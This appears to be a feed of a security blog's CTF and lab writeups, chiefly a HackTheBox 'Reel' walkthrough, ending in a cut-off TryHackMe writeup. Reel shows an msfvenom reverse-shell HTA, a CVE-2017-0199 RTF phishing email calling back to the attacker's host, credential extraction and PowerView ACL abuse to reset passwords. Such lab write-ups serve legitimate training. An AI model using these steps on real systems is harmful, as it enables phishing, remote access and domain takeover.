class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peano</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        in_lst = peano(n - <span class="number">1</span>)</span><br><span class="line">        lst = in_lst.copy()</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + <span class="number">1</span> + i[<span class="number">0</span>], py - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py - <span class="number">1</span> - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py - <span class="number">1</span> - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + <span class="number">1</span> + i[<span class="number">0</span>], py + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">order = peano(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&quot;./1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">width, height = img.size</span><br><span class="line"></span><br><span class="line">block_width = width <span class="comment"># // 3</span></span><br><span class="line">block_height = height <span class="comment"># // 3</span></span><br><span class="line"></span><br><span class="line">new_image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, (x, y) <span class="keyword">in</span> tqdm(<span class="built_in">enumerate</span>(order)):</span><br><span class="line">    <span class="comment"># 根据列表顺序获取新的坐标</span></span><br><span class="line">    new_x, new_y = i % width, i // width</span><br><span class="line">    <span class="comment"># 获取原图像素</span></span><br><span class="line">    pixel = img.getpixel((x, height - <span class="number">1</span> - y))</span><br><span class="line">    <span class="comment"># 在新图像中放置像素</span></span><br><span class="line">    new_image.putpixel((new_x, new_y), pixel)</span><br><span class="line"></span><br><span class="line">new_image.save(<span class="string">&quot;rearranged_image.jpg&quot;</span>) </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180947540-1228530137.png" alt="image-20241030180941362"></p><p>扫码即可</p>]]></content>
    
    
    <summary type="html">网鼎杯 青龙组 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://ya1orin.github.io/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://ya1orin.github.io/tags/CTF/"/>
    
    <category term="Competition" scheme="https://ya1orin.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Reel</title>
    <link href="https://ya1orin.github.io/posts/4097f734.html"/>
    <id>https://ya1orin.github.io/posts/4097f734.html</id>
    <published>2024-10-27T05:34:07.000Z</published>
    <updated>2024-11-13T05:19:54.783Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.77</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>RTF钓鱼</li><li>ACL滥用-user-WriteOwner权限</li><li>ACL滥用-group-WriteDacl权限</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.10.77</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 13:44 CST</span><br><span class="line">Nmap scan report for 10.10.10.77</span><br><span class="line">Host is up (0.76s latency).</span><br><span class="line">Not shown: 65527 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          Microsoft ftpd</span><br><span class="line">| ftp-syst:</span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_05-28-18  11:19PM       &lt;DIR&gt;          documents</span><br><span class="line">22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)</span><br><span class="line">|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)</span><br><span class="line">|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)</span><br><span class="line">25/tcp    open  smtp?</span><br><span class="line">| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|   Hello:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     EHLO Invalid domain address.</span><br><span class="line">|   Help:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">|   SIPOptions:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|   TerminalServerCookie:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|_    sequence of commands</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49159/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">...</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: specialized</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 7 (85%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2012::-</span><br><span class="line">|   Computer name: REEL</span><br><span class="line">|   NetBIOS computer name: REEL\x00</span><br><span class="line">|   Domain name: HTB.LOCAL</span><br><span class="line">|   Forest name: HTB.LOCAL</span><br><span class="line">|   FQDN: REEL.HTB.LOCAL</span><br><span class="line">|_  System time: 2024-10-27T05:48:32+00:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-27T05:48:28</span><br><span class="line">|_  start_date: 2024-10-27T05:35:31</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:0:2:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 2s, deviation: 3s, median: 0s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 445/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   644.73 ms 10.10.16.1</span><br><span class="line">2   961.24 ms 10.10.10.77</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 263.65 seconds</span><br></pre></td></tr></table></figure><p>开放21，22，25等若干端口，同时通过脚本扫描结果可知，该域名是<code>REEL.HTB.LOCAL</code>和<code>HTB.LOCAL</code>，将其添加到<code>/etc/hosts</code>文件中</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135321701-294670808.png" alt="image-20241027135319436"></p><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>从扫描结果可知，ftp是允许匿名登录的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp anonymous@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135531142-1779717189.png" alt="image-20241027135528981"></p><p>发现三个文件，全部下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prompt off</span><br><span class="line">mget *</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135724047-432466087.png" alt="image-20241027135721726"></p><p>全部查看一下</p><ul><li>readme.txt</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135939835-2118791.png" alt="image-20241027135937958"></p><p>发现是要使用邮件发送rtf格式的文件，并且文档都会保存到这里</p><ul><li>AppLocker.docx</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140116875-11898502.png" alt="image-20241027140115107"></p><ul><li>Windows Event Forwarding.docx</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140535714-592406716.png" alt="image-20241027140533430"></p><p>打开后发现文件已经损坏，使用<code>exiftool</code>检查数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool Windows\ Event\ Forwarding.docx</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140726612-828137712.png" alt="image-20241027140724359"></p><p>找到了个邮箱<code>nico@megabank.com</code></p><h1 id="RTF钓鱼"><a href="#RTF钓鱼" class="headerlink" title="RTF钓鱼"></a>RTF钓鱼</h1><p>漏洞链接：<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0199">CVE-2017-0199</a></p><p>使用<code>msfvenom</code>生成一个HTA文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=8888 -f hta-psh -o shell.hta</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027142449226-1612502237.png" alt="image-20241027142446919"></p><p>使用<a href="https://github.com/bhdresh/CVE-2017-0199">CVE-2017-0199</a>中的脚本创建一个RTF文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w shell.rtf -u http://10.10.16.4/shell.hta -t rtf -x 0</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027142911589-1627462942.png" alt="image-20241027142909573"></p><p>先启动一个http服务，在准备一个nc监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143033400-71778760.png" alt="image-20241027143031493"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143041473-540171105.png" alt="image-20241027143039426"></p><p>使用<code>sendemail</code>发送邮件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendEmail -f root@admin.com -t nico@megabank.com -u <span class="string">&quot;look me&quot;</span> -m <span class="string">&quot;click me&quot;</span> -a shell.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143939282-234032504.png" alt="image-20241027143936622"></p><p>大约等待30s左右，就获得到shell了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027144231417-1596098132.png" alt="image-20241027144229331"></p><p>找到<code>user.txt</code></p><h1 id="nico-gt-Tom"><a href="#nico-gt-Tom" class="headerlink" title="nico -&gt; Tom"></a>nico -&gt; Tom</h1><p>在<code>nico</code>桌面上发现还有个<code>cred.xml</code>，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027144606786-1891749689.png" alt="image-20241027144604507"></p><p>发现是<code>tom</code>的用户名和密码</p><p>可以使用<code>Powershell</code>的<code>PSCredential</code>，它提供了一种存储用户名、密码和凭据的方法。还有两个函数<code>Import-CliXml</code>和<code>Export-CliXml</code> ，用于将这些凭据保存到文件中以及从文件中恢复它们。</p><p>使用<code>Import-CliXml</code>加载文件来获取明文密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">&quot;<span class="variable">$cred</span> = Import-CliXml -Path cred.xml; <span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145028630-177734907.png" alt="image-20241027145026052"></p><p>获取到<code>Tom</code>用户的明文密码<code>1ts-mag1c!!!</code></p><p>尝试使用ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145337858-1210501876.png" alt="image-20241027145335727"></p><h1 id="AD-Privesc"><a href="#AD-Privesc" class="headerlink" title="AD Privesc"></a>AD Privesc</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145617853-1021058284.png" alt="image-20241027145615560"></p><p>注意到桌面上有个<code>AD Audit</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145705349-1312903517.png" alt="image-20241027145703246"></p><p>先查看一下<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145804355-665684367.png" alt="image-20241027145802362"></p><p>查看一下其他文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027150322032-1642287028.png" alt="image-20241027150319779"></p><p>结合提示并实践后发现，运行不了<code>SharpHound.exe</code>，无法使用<code>Bloodhound</code>进行信息收集，所以我们目标放在<code>acls.csv</code>上</p><p>使用<code>scp</code>将文件下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp Tom@10.10.10.77:<span class="string">&#x27;/Users/tom/Desktop/AD Audit/BloodHound/Ingestors/acls.csv&#x27;</span> ./</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027150858200-1795280760.png" alt="image-20241027150855646"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151056577-147523502.png" alt="image-20241027151054397"></p><p>是一个<code>ACL</code>的文件，分析一下，先对<code>PrincipalName</code>简单筛选一下<code>Tom</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151304099-1184542152.png" alt="image-20241027151302192"></p><p>发现<code>Tom</code>对<code>claire</code>有<code>WriteOwner</code>权限，在搜索一下<code>claire</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151757888-1784963385.png" alt="image-20241027151756078"></p><p>发现<code>claire</code>对<code>Backup_Admins</code>组有<code>WriteDacl</code>权限</p><h1 id="Tom-gt-claire"><a href="#Tom-gt-claire" class="headerlink" title="Tom-&gt;claire"></a>Tom-&gt;claire</h1><p>注意到之前在<code>tom</code>机器上有<code>PowerView.ps1</code></p><p>所以我们使用<code>WriteOwner</code>权限和<code>PowerView.ps1</code>的功能来登录<code>claire</code></p><p>需要执行以下步骤：</p><ul><li>成为<code>claire</code>的ACL的所有者</li><li>获取该ACL权限</li><li>使用权限更改密码</li></ul><p>先导入<code>PowerView.ps1</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027152937745-1565451432.png" alt="image-20241027152935704"></p><p>先把<code>Tom</code>设置成为<code>claire</code>的ACL的所有者</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainObjectOwner</span> <span class="literal">-identity</span> claire <span class="literal">-OwnerIdentity</span> tom</span><br></pre></td></tr></table></figure><p>给予<code>Tom</code>更改ACL上密码的权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> claire <span class="literal">-PrincipalIdentity</span> tom <span class="literal">-Rights</span> ResetPassword</span><br></pre></td></tr></table></figure><p>最后创建一个密码，然后给<code>claire</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Aa123456!&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-force</span></span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-identity</span> claire <span class="literal">-accountpassword</span> <span class="variable">$pass</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027154433915-1759841619.png" alt="image-20241027154431882"></p><p>然后就可以通过ssh登录<code>claire</code>用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027154519928-224576146.png" alt="image-20241027154517959"></p><h1 id="claire-gt-Backup-Admins"><a href="#claire-gt-Backup-Admins" class="headerlink" title="claire-&gt;Backup_Admins"></a>claire-&gt;Backup_Admins</h1><p>之前的ACL分析可知<code>claire</code>对<code>Backup_Admins</code>组有<code>WriteDacl</code>权限，可以用它将<code>claire</code>加入该组</p><p>先查看一下<code>Backup_Admins</code>组</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155028571-432531593.png" alt="image-20241027155026424"></p><p>当前用户只有<code>ranj</code></p><p>现在添加<code>claire</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins claire /add</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155115663-1003890863.png" alt="image-20241027155113754"></p><p>再查看一下<code>Backup_Admins</code>组</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155143258-1109182793.png" alt="image-20241027155141343"></p><p>发现已经<code>claire</code>在<code>Backup_Admins</code>组中了，重新登录使其生效</p><p><strong>ps: 重新登陆没有成功的，需要在执行一遍 Tom-&gt;claire 的操作</strong></p><h1 id="Backup-Admins-gt-Administrator"><a href="#Backup-Admins-gt-Administrator" class="headerlink" title="Backup_Admins-&gt;Administrator"></a>Backup_Admins-&gt;Administrator</h1><p>目前我们以<code>claire</code>身份登录，并是<code>Backup_Admins</code>组的成员</p><p>说明我们有查看<code>Administrator</code>文件的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160444426-963998426.png" alt="image-20241027160442280"></p><p>找到<code>root.txt</code>，但是我们没权限查看，注意到有个<code>Backuo Scripts</code>目录，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160633334-1179167874.png" alt="image-20241027160630997"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160743097-1088951995.png" alt="image-20241027160741004"></p><p>最后在<code>BackupScript.ps1</code>文件中找到<code>Admin</code>的密码<code>Cr4ckMeIfYouC4n!</code></p><p>ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh Administrator@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027161035554-273633219.png" alt="image-20241027161033587"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027161109110-316346945.png" alt="image-20241027161106839"></p><p>最终找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBox篇Active Directory 101系列之Reel</summary>
    
    
    
    <category term="HackTheBox" scheme="https://ya1orin.github.io/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://ya1orin.github.io/tags/HTB/"/>
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="Active Directory 101" scheme="https://ya1orin.github.io/tags/Active-Directory-101/"/>
    
  </entry>
  
  <entry>
    <title>THM-Reset</title>
    <link href="https://ya1orin.github.io/posts/fa5fb889.html"/>
    <id>https://ya1orin.github.io/posts/fa5fb889.html</id>
    <published>2024-10-25T05:45:52.000Z</published>
    <updated>2024-11-13T05:19:50.891Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.219.65</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.219.65</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 13:49 CST</span><br><span class="line">Nmap scan report for 10.10.219.65</span><br><span class="line">Host is up (0.63s latency).</span><br><span class="line">Not shown: 65515 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-25 05:50:16Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span 